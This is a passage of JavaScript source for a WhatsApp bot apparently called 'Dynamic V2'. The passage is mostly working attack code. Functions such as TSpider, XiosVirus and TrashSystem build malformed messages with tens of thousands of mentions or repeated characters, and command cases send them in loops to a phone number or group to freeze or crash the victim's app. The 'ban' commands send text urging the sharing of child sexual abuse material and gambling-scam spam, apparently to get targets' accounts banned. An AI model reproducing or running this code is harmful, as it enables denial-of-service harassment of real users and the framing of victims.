								caption: " p "
							},
							placeholderKey: {
								remoteJid: "0@s.whatsapp.net",
								fromMe: false,
								id: "ABCDEF1234567890"
							},
							expiration: 86400,
							ephemeralSettingTimestamp: "1728090592378",
							ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
							externalAdReply: {
								title: "̟",
								body: "̟",
								mediaType: "VIDEO",
								renderLargerThumbnail: true,
								previewType: "VIDEO",
								thumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/...",
								sourceType: " p ",
								sourceId: " p ",
								sourceUrl: "p",
								mediaUrl: "p",
								containsAutoReply: true,
								showAdAttribution: true,
								ctwaClid: "ctwa_clid_example",
								ref: "ref_example"
							},
							entryPointConversionSource: "entry_point_source_example",
							entryPointConversionApp: "entry_point_app_example",
							entryPointConversionDelaySeconds: 5,
							disappearingMode: {},
							actionLink: {
								url: "p"
							},
							groupSubject: " p ",
							parentGroupJid: "6287888888888-1234567890@g.us",
							trustBannerType: " p ",
							trustBannerAction: 1,
							issampled: false,
							utm: {
								utmSource: " p ",
								utmCampaign: " p "
							},
							forwardedNewsletterMessageInfo: {
								newsletterJid: "6287888888888-1234567890@g.us",
								serverMessageId: 1,
								newsletterName: " p ",
								contentType: "UPDATE",
								accessibilityText: " p "
							},
							businessMessageForwardInfo: {
								businessOwnerJid: "0@s.whatsapp.net"
							},
							smbClientCampaignId: "smb_client_campaign_id_example",
							smbServerCampaignId: "smb_server_campaign_id_example",
							dataSharingContext: {
								showMmDisclosure: true
							}
						}
					}
				},
				ptcp ? {
					participant: {
						jid: target
					}
				} : {}
			);
			console.log(chalk.green("bot Sent Virus ✅"));
		};
    //========================
    async function TSpider(target, pic, Ptcp = true) {
   await sam.relayMessage(target, {
     ephemeralMessage: {
      message: {
       interactiveMessage: {
        header: {
         documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
          fileLength: "9999999999999",
          pageCount: 1316134911,
          mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
          fileName: "᳀ 𝐏᪲᪱‌𝐫𝐒𝐩𝐢𝐝𝐞𝐫-𝐅𝐚‌𝐭‌𝐚𝐥‌𝐄‌𝐱𝐞𝐜‌𝐮‌𝐭𝐞 メ",
          fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
          directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1726867151",
          contactVcard: true,
          jpegThumbnail: pic,
         },
         hasMediaAttachment: true,
        },
        body: {
         text: "🏴‍☠️ 𝐏᪲᪱‌𝐫𝐒𝐩𝐢𝐝𝐞𝐫-𝐅𝐚‌𝐭‌𝐚𝐥‌𝐄‌𝐱𝐞𝐜‌𝐮‌𝐭𝐞 🦣\n" + "@6285655649546".repeat(17000),
        },
        nativeFlowMessage: {
         buttons: [{
           name: "cta_url",
           buttonParamsJson: "{ display_text: '✨⃟༑⌁⃰𝐒𝐩𝐢𝐝𝐞𝐫 𝐂𝐫𝐚𝐬𝐡 ϟ〽️', url: \"https://youtube.com/king_sam_hub\", merchant_url: \"https://youtube.com/king_sam_hub\" }",
          },
          {
           name: "call_permission_request",
           buttonParamsJson: "{}",
          },
         ],
         messageParamsJson: "{}",
        },
        contextInfo: {
         mentionedJid: ["6285655649546@s.whatsapp.net", ...Array.from({
          length: 30000
         }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
         forwardingScore: 1,
         isForwarded: true,
         fromMe: false,
         participant: "0@s.whatsapp.net",
         remoteJid: "status@broadcast",
         quotedMessage: {
          documentMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
           fileLength: "9999999999999",
           pageCount: 1316134911,
           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
           fileName: "𝐒𝐏𝐈𝐃𝐄𝐑-𝐕9〽️",
           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1724474503",
           contactVcard: true,
           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
           thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
           jpegThumbnail: "",
          },
         },
        },
       },
      },
     },
    },
    Ptcp ? {
     participant: {
      jid: target
     }
    } : {}
   );
   console.log(chalk.green("Send Bug By Spider〽️"));
  };
async function TrashSystem(target, spider, Ptcp = true) {
   await sam.relayMessage(target, {
     ephemeralMessage: {
      message: {
       interactiveMessage: {
        header: {
         documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
          fileLength: "9999999999999",
          pageCount: 1316134911,
          mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
          fileName: "᳀ 𝐏᪲᪱‌𝐫𝐒𝐩𝐢𝐝𝐞𝐫-𝐅𝐚‌𝐭‌𝐚𝐥‌𝐄‌𝐱𝐞𝐜‌𝐮‌𝐭𝐞 メ",
          fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
          directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1726867151",
          contactVcard: true,
          jpegThumbnail: spider,
         },
         hasMediaAttachment: true,
        },
        body: {
         text: "🏴‍☠️ 𝐏᪲᪱‌𝐫𝐒𝐩𝐢𝐝𝐞𝐫-𝐅𝐚‌𝐭‌𝐚𝐥‌𝐄‌𝐱𝐞𝐜‌𝐮‌𝐭𝐞 🦣\n" + "@6285655649546".repeat(17000),
        },
        contextInfo: {
         mentionedJid: ["6285655649546@s.whatsapp.net", ...Array.from({
          length: 30000
         }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
         forwardingScore: 1,
         isForwarded: true,
         fromMe: false,
         participant: "0@s.whatsapp.net",
         remoteJid: "status@broadcast",
         quotedMessage: {
          documentMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
           fileLength: "9999999999999",
           pageCount: 1316134911,
           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
           fileName: "𝐒𝐏𝐈𝐃𝐄𝐑-𝐕9〽️",
           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1724474503",
           contactVcard: true,
           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
           thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
           jpegThumbnail: spider,
          },
         },
        },
       },
      },
     },
    },
    ptcp ? { participant: { jid: target } } : {}
    );
};
async function XiosVirus(jid) {
			sam.relayMessage(jid, {
				'extendedTextMessage': {
					'text': '.',
					'contextInfo': {
						'stanzaId': jid,
						'participant': jid,
						'quotedMessage': {
							'conversation': '⭑̤⟅̊༑ ▾ ⋆✩⋆ 𝐅𝐢𝐧𝐢𝐬𝐡𝐞𝐫 𝐕𝟓 𝐕𝐢𝐩 ⋆✩⋆⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤' + 'ꦾ'.repeat(50000)
						},
						'disappearingMode': {
							'initiator': "CHANGED_IN_CHAT",
							'trigger': "CHAT_SETTING"
						}
					},
					'inviteLinkGroupTypeV2': "DEFAULT"
				}
			}, {
				'participant': {
					'jid': jid
				}
			}, {
				'messageId': null
			});
			console.log(chalk.red("Succes Send Bug"));
		};

		async function XiosPay(jid) {
			sam.relayMessage(jid, {
				'paymentInviteMessage': {
					'serviceType': "UPI",
					'expiryTimestamp': Date.now() + 86400000
				}
			}, {
				'participant': {
					'jid': jid
				}
			});
			console.log(chalk.red("Succes Send Bug"));
		};

//===================°°
const qkontak = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6285624297893:+62 856-2429-7893\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}		
		
//=========================================//

switch (command) {
//==================≠==========≠===========≠//
case 'ban1':{
let kimg=`Привет, пользователи, мы из компании Whatsapp, мы заметили, что вы продаете порнографию в Whatsapp meta Марк Цукерберг, я советую вам продавать всю детскую обнаженную натуру компании Whatsapp, и простой способ заработать деньги заключается в том, что вы можете делиться детской порнографией на всех платформах meta, таких как Whatsapp, Instagram и Facebook. сделав это , вы будете вознаграждены этим человеком большой суммой денег.
https://api.whatsapp.com/send?phone=`
sam.sendMessage(m.chat, { 
	           text: kimg,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `𝗗𝗬𝗡𝗔𝗠𝗜𝗖-𝗩2`,
                            body: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
                            thumbnailUrl: `https://files.catbox.moe/zz7dz4.jpg`, 
                            sourceUrl: `https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e`,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                    
                    }),
await sam.sendMessage(m.chat, {
audio: bug,
mimetype: 'audio/mpeg'
}, { quoted: m
})
}
break
case 'ban2':{
let kimg=`ALEGRE! Slots Gacor confiáveis e lucrativos no Brasil!

⏳site de apostas confiável que possui usuários conhecidos e muitos bônus diários.
🎁se você for um novo usuário e fizer um depósito de US$ 10 a US$ 50, você receberá um bônus de 24$ por três dias consecutivos. 70% dos usuários do nosso site de slots se tornaram bilionários desde que se resamraram em nosso site há algumas semanas🥳. porque nosso administrador forneceu instruções para que novos usuários possam entender quando jogar e prestar assistência para que possam ganhar muito dinheiro em apenas alguns dias🌤️.
Nosso site possui muitos jogos para que todos os usuários não se sintam entediados. Nós, como administradores, oferecemos um bônus em dinheiro de US$ 10 para aqueles que convidaram suas famílias para jogar em nosso site🥳🤩
Você está interessado em jogar em nosso site de caça-níqueis, que atualmente é o mais popular do Brasil? Se quiser jogar você pode acessar nosso site de slots abaixo:
https://paficrb.com/slotgacor/
Se você, como usuário, deseja pedir ajuda ao jogar em nosso site, pode entrar em contato com nosso administrador através do número de WhatsApp abaixo 👇👇👇
https://api.whatsapp.com/send?phone=`
sam.sendMessage(m.chat, { 
	           text: kimg,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `𝗗𝗬𝗡𝗔𝗠𝗜𝗖-𝗩2`,
                            body: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
                            thumbnailUrl: `https://files.catbox.moe/zz7dz4.jpg`, 
                            sourceUrl: `https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e`,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                    
                    }),
await sam.sendMessage(m.chat, {
audio: bug,
mimetype: 'audio/mpeg'
}, { quoted: extd
})
}
break
case 'ban2':{
let kimg=`ðŸ”¥ O site do casino que esteve fechado durante muito tempo estÃ¡ de volta ðŸ”¥
ðŸš€ foi atualizado. um site de casino que jÃ¡ chocou o Brasil porque este site jÃ¡ pagou R$ 900,000,000,00 reais!! 
â° Os novos utilizadores que se resamarem e depositarem 50â‚¬ ganharÃ£o uma mÃ¡quina de jogos grÃ¡tis, apenas para as 10 pessoas mais rÃ¡pidas!! serÃ¡ invÃ¡lido em 3 dias. 
ðŸŽ Primeiro BÃ³nus: 100% do primeiro depÃ³sito atÃ© 300â‚¬ e 30 rotaÃ§Ãµes livres.
Segundo BÃ³nus: 50% do segundo depÃ³sito atÃ© 350â‚¬ e 35 rotaÃ§Ãµes livres.
ðŸŽ‰ 100% no primeiro depÃ³sito atÃ© mais de R$ 1.200 Ã© apenas para utilizadores que queiram partilhar o link fornecido pelo administrador, basta partilhar em vÃ¡rias aplicaÃ§Ãµes como WhatsApp, Instagram, Telegram. 

ðŸª­melhor site do momentoðŸª­
https://1xbet1.com.br/

ðŸ“ž contacte o administrador para solicitar link caso pretenda ganhar 1.200â‚¬; https://web.whatsapp.com/telefone/send?phone=`
sam.sendMessage(m.chat, { 
	           text: kimg,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `𝗗𝗬𝗡𝗔𝗠𝗜𝗖-𝗩2`,
                            body: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
                            thumbnailUrl: `https://files.catbox.moe/zz7dz4.jpg`, 
                            sourceUrl: `https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e`,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                    
                    }),
await sam.sendMessage(m.chat, {
audio: bug,
mimetype: 'audio/mpeg'
}, { quoted: extd
})
}
break
case "public": {
if (!isOwner) return reply(mess.owner)
sam.public = true
reply("> samMIC IS NOW ON A PUBLIC MODE")
}
break
case "ping": case "speed": { 
let timestamp = speed()
let latensi = speed() - timestamp

         m.reply (`━━━━━━━━━━━━━━━━━\n\◉ 𝙷𝙴𝙻𝙻𝙾 ${m.pushName}\n\━━━━━━━━━━━━━━━━━\n\◈𝙳𝚈𝙽𝙰𝙼𝙸𝙲 𝚅2  𝚂𝙿𝙴𝙴𝙳   : ${latensi.toFixed(4)} 𝐌𝐒\n\━━━━━━━━━━━━━━━━━`); 
         } 
 break; 
case "runtime":
                let pinga = ` 𝙳𝚈𝙽𝙰𝙼𝙸𝙲 𝚅2 ${runtime(process.uptime())}`
               sam.sendMessage(m.chat, {
                    text: pinga,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `𝚂𝙿𝙸𝙳𝙴𝚁 𝚅9`,
                            body: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
                            thumbnailUrl: spider ,
                            sourceUrl: 'https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e',
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: extd
                })
                break
case "self": {
if (!isOwner) return reply(mess.owner)
sam.public = false
reply("> samMIC IS NOW ON PRIVATE MODE")
}
break
case 'info':{
let timestamp = speed()
let latensi = speed() - timestamp
let run = runtime(process.uptime())
let kimg=`
     \`𝐃𝐘𝐍𝐀𝐌𝐈𝐂-𝐕2\`    
▰▰▰▰▰▰▰▰▰▰▰▰▰▰
> 𝑯𝒆𝒍𝒍𝒐   ${m.pushName} 𝑫𝒚𝒏𝒂𝒎𝒊𝒄 𝑼𝒔𝒆𝒓
> 𝑷𝒓𝒆𝒇𝒊𝒙 ${prefix}
> 𝑩𝒐𝒕 𝑺𝒑𝒆𝒆𝒅 ${latensi.toFixed(4)}
> 𝑼𝒑𝒕𝒊𝒎𝒆 ${run}
> 𝑽𝒆𝒓𝒔𝒊𝒐𝒏 : 6.7.7
> 𝑵𝑰𝑪𝑲𝑵𝑨𝑴𝑬 : 𝑫𝒚𝒏𝒂
> 𝑺𝒕𝒂𝒕𝒖𝒔 : 𝑽𝑰𝑷 🪀
> 𝑶𝒘𝒏𝒆𝒓 𝑵𝒖𝒎 : +254742491666
> 𝑶𝒘𝒏𝒆𝒓 𝑵𝒂𝒎𝒆 : 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
▰▰▰▰▰▰▰▰▰▰▰▰▰▰
> 𝑇𝒉𝑎𝑛𝑘𝑠 𝐹𝑜𝑟 𝑈𝑠𝑖𝑛𝑔 𝐷𝑦𝑛𝑎𝑚𝑖𝑐 𝐵𝑜𝑡
  © 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`
sam.sendMessage(m.chat, { 
	           text: kimg,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `𝗗𝗬𝗡𝗔𝗠𝗜𝗖-𝗩2`,
                            body: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
                            thumbnailUrl: `https://files.catbox.moe/zz7dz4.jpg`, 
                            sourceUrl: `https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e`,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                    
                    }),
await sam.sendMessage(m.chat, {
audio: music,
mimetype: 'audio/mpeg'
}, { quoted: extd
})
}
break
 case 'sam':{
let timestamp = speed()
let latensi = speed() - timestamp
let run = runtime(process.uptime())
let kimg=`
     \`𝐃𝐘𝐍𝐀𝐌𝐈𝐂-𝐕2\`    
▰▰▰▰▰▰▰▰▰▰▰▰▰▰
> 𝑯𝒆𝒍𝒍𝒐   ${m.pushName} 𝑫𝒚𝒏𝒂𝒎𝒊𝒄 𝑼𝒔𝒆𝒓
> 𝑷𝒓𝒆𝒇𝒊𝒙 ${prefix}
> 𝑩𝒐𝒕 𝑺𝒑𝒆𝒆𝒅 ${latensi.toFixed(4)}
> 𝑼𝒑𝒕𝒊𝒎𝒆 ${run}
> 𝑽𝒆𝒓𝒔𝒊𝒐𝒏 : 6.7.7
> 𝑵𝑰𝑪𝑲𝑵𝑨𝑴𝑬 : 𝑫𝒚𝒏𝒂
> 𝑺𝒕𝒂𝒕𝒖𝒔 : 𝑽𝑰𝑷 🪀
> 𝑶𝒘𝒏𝒆𝒓 𝑵𝒖𝒎 : +254742491666
> 𝑶𝒘𝒏𝒆𝒓 𝑵𝒂𝒎𝒆 : 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
▰▰▰▰▰▰▰▰▰▰▰▰▰▰
        \`𝗢𝗪𝗡𝗘𝗥 𝗖𝗠𝗗\` 
▰▰▰▰▰▰▰▰▰▰▰▰▰▰
> *~addprem~*
> *~addowner~*
> *~delprem~*
> *~delowner~*
> *~public~*
> *~self~*
▰▰▰▰▰▰▰▰▰▰▰▰▰▰
      \`𝗘𝗫𝗧𝗥𝗔\` 
▰▰▰▰▰▰▰▰▰▰▰▰▰▰
> *~ping~*
> *~runtime~*
> *~alive~*
> *~owner~*
> *~Channel~*
▰▰▰▰▰▰▰▰▰▰▰▰▰▰
    \`𝗔𝗧𝗧𝗔𝗖𝗞 + (𝗡𝗨𝗠)\` 
▰▰▰▰▰▰▰▰▰▰▰▰▰▰
> *~sam-hard~*
> *~ui-flow~*
> *~ui-hard~*
> *~vigorous~*
> *~ios-lv~* ( iphone )
> *~kill-ios~* ( iphone )
> *~hard-freeze~*
> *~home-cult~*
> *~lava~*
> *~dgc~* (gc link)
> *~flooded~*
> *~infinite~*
▰▰▰▰▰▰▰▰▰▰▰▰▰▰
   \`𝗔𝗧𝗧𝗔𝗖𝗞 𝘿𝙄𝙍𝙀𝘾𝙏 𝘿𝙈\` 
▰▰▰▰▰▰▰▰▰▰▰▰▰▰
> *~v1~*
> *~tackle~*
> *~p1~*
> *~penetrate~* 
▰▰▰▰▰▰▰▰▰▰▰▰▰▰
     \`𝗕𝗔𝗡 𝗠𝗘𝗡𝗨\` 
▰▰▰▰▰▰▰▰▰▰▰▰▰▰
> *~ban1~*
> *~ban2~*
> *~ban3~*
▰▰▰▰▰▰▰▰▰▰▰▰▰▰
> 𝑇𝒉𝑎𝑛𝑘𝑠 𝐹𝑜𝑟 𝑈𝑠𝑖𝑛𝑔 𝐷𝑦𝑛𝑎𝑚𝑖𝑐 𝐵𝑜𝑡
  © 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`
sam.sendMessage(m.chat, { 
	           text: kimg,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `𝗗𝗬𝗡𝗔𝗠𝗜𝗖-𝗩2`,
                            body: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
                            thumbnailUrl: `https://files.catbox.moe/zz7dz4.jpg`, 
                            sourceUrl: `https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e`,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                    
                    }),
await sam.sendMessage(m.chat, {
audio: music,
mimetype: 'audio/mpeg'
}, { quoted: extd
})
}
break
case 'downer': {
let timestamp = speed()
let latensi = speed() - timestamp
let run = runtime(process.uptime())
let kimg=`
     \`𝐃𝐘𝐍𝐀𝐌𝐈𝐂-𝐕2\`    
▰▰▰▰▰▰▰▰▰▰▰▰▰▰
> 𝑯𝒆𝒍𝒍𝒐   ${m.pushName} 𝑫𝒚𝒏𝒂𝒎𝒊𝒄 𝑼𝒔𝒆𝒓
> 𝑷𝒓𝒆𝒇𝒊𝒙 ${prefix}
> 𝑩𝒐𝒕 𝑺𝒑𝒆𝒆𝒅 ${latensi.toFixed(4)}
> 𝑼𝒑𝒕𝒊𝒎𝒆 ${run}
> 𝑽𝒆𝒓𝒔𝒊𝒐𝒏 : 6.7.7
> 𝑵𝑰𝑪𝑲𝑵𝑨𝑴𝑬 : 𝑫𝒚𝒏𝒂
> 𝑺𝒕𝒂𝒕𝒖𝒔 : 𝑽𝑰𝑷 🪀
> 𝑶𝒘𝒏𝒆𝒓 𝑵𝒖𝒎 : +254742491666
> 𝑶𝒘𝒏𝒆𝒓 𝑵𝒂𝒎𝒆 : 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
▰▰▰▰▰▰▰▰▰▰▰▰▰▰
        \`𝗢𝗪𝗡𝗘𝗥 𝗖𝗠𝗗\` 
▰▰▰▰▰▰▰▰▰▰▰▰▰▰
> *~addprem~*
> *~addowner~*
> *~delprem~*
> *~delowner~*
> *~public~*
> *~self~*
▰▰▰▰▰▰▰▰▰▰▰▰▰▰
© 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`
sam.sendMessage(m.chat, { 
	           text: kimg,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `𝗗𝗬𝗡𝗔𝗠𝗜𝗖-𝗩2`,
                            body: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
                            thumbnailUrl: `https://files.catbox.moe/zz7dz4.jpg`, 
                            sourceUrl: `https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e`,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                    
                    }),
await sam.sendMessage(m.chat, {
audio: music,
mimetype: 'audio/mpeg'
}, { quoted: extd
})
}
break
case 'sam-hard': case 'vigorous': case 'flooded': case 'ifinite': {
if (!isOwner) return reply(mess.prem)
if (!q) return reply(`Example: ${prefix + command} 254###`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
for (let i = 0; i < 70; i++) {
await freezekamoflase(target, true)
await newfreezebug(target, true)
await nulltag(target, true)
await NewsletterZap(target, true)
await freezeui(target, true)
await freezeuii(target, true)

}
reply(`
🦣 𝐃𝐘𝐍𝐀𝐌𝐈𝐂 𝐇𝐀𝐒 𝐃𝐄𝐋𝐈𝐕𝐄𝐑𝐄𝐃 🦈
━━━━━━━━━━━━━━━━━━━━━━
߷ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
֎ 𝐑𝐄𝐒𝐔𝐋𝐓 : 𝗨𝗧𝗜𝗟𝗜𝗦𝗘𝗗
᪣ 𝐔𝐒𝐈𝐍𝐆 : ${command}
━━━━━━━━━━━━━━━━━━━━━━
   `)
await sleep(2000)
await sam.sendMessage(m.chat, {
audio: bug,
mimetype: 'audio/mpeg'
}, { quoted: extd
})
}
break
case "kill-lv": case "kill-ios": {
if (!isOwner) return reply(mess.owner)
if (!q) return reply(`Example\n ${prefix + command} 254xxxx`)
X = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyzz("𝐃𝐲𝐧𝐚𝐦𝐢𝐭𝐞 🦄")
for (let i = 0; i < 10; i++) {
await XiosPay(target)
await XiosVirus(target)
await TxIos(target, Ptcp = true)
await sleep(1)
}
sam.sendMessage(m.chat, {react: {text: '🦄', key: m.key}})
}
break
case 'home-cult': case 'lava': {
if (!isOwner) return reply(mess.prem)
if (!q) return reply(`Example: ${prefix + command} 254###`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
for (let i = 0; i < 70; i++) {
await freezekamoflase(target, true)
await nulltag(target, true)
await nulltag(target, true)
await NewsletterZap(target, true)
await freezegc(target, true)
await freezeuii(target, true)

}
reply(`
🦣 𝐃𝐘𝐍𝐀𝐌𝐈𝐂 𝐇𝐀𝐒 𝐃𝐄𝐋𝐈𝐕𝐄𝐑𝐄𝐃 🦈
━━━━━━━━━━━━━━━━━━━━━━
߷ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
֎ 𝐑𝐄𝐒𝐔𝐋𝐓 : 𝗨𝗧𝗜𝗟𝗜𝗦𝗘𝗗
᪣ 𝐔𝐒𝐈𝐍𝐆 : ${command}
━━━━━━━━━━━━━━━━━━━━━━
   `)
await sleep(2000)
await sam.sendMessage(m.chat, {
audio: bug,
mimetype: 'audio/mpeg'
}, { quoted: extd
})
}
case 'dgc': {
if (!isOwner) return reply(mess.prem)
if (!q) return reply(`Use .${command} https://chat.whatsapp.com/`)
replyzz(`</> Bugs have been sent... `)
let result = args[0].split('https://chat.whatsapp.com/')[1];
let target = await sam.groupAcceptInvite(result);
for (let i = 0; i < 70; i++) {
await caltx(target, true)
await sleep(10)
await freezegc(target, true)
}
reply(`
🦣 𝐃𝐘𝐍𝐀𝐌𝐈𝐂 𝐇𝐀𝐒 𝐃𝐄𝐋𝐈𝐕𝐄𝐑𝐄𝐃 🦈
━━━━━━━━━━━━━━━━━━━━━━
߷ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
֎ 𝐑𝐄𝐒𝐔𝐋𝐓 : 𝗨𝗧𝗜𝗟𝗜𝗦𝗘𝗗
᪣ 𝐔𝐒𝐈𝐍𝐆 : ${command}
━━━━━━━━━━━━━━━━━━━━━━
   `)
await sleep(2000)
await sam.sendMessage(m.chat, {
audio: bug,
mimetype: 'audio/mpeg'
}, { quoted: extd
})
}
break

break
case 'ui-hard': case 'ui-freeze': case 'flooded': {
if (!isOwner) return reply(mess.prem)
if (!q) return reply(`Example: ${prefix + command} 254###`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
for (let i = 0; i < 70; i++) {
await freezekamoflase(target, true)
await freezeui(target, true)
await freezeuii(target, true)
await newvirpen(target, true)
await freezeui(target, true)
await freezeuii(target, true)

}
reply(`
🦣 𝐃𝐘𝐍𝐀𝐌𝐈𝐂 𝐇𝐀𝐒 𝐃𝐄𝐋𝐈𝐕𝐄𝐑𝐄𝐃 🦈
━━━━━━━━━━━━━━━━━━━━━━
߷ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
֎ 𝐑𝐄𝐒𝐔𝐋𝐓 : 𝗨𝗧𝗜𝗟𝗜𝗦𝗘𝗗
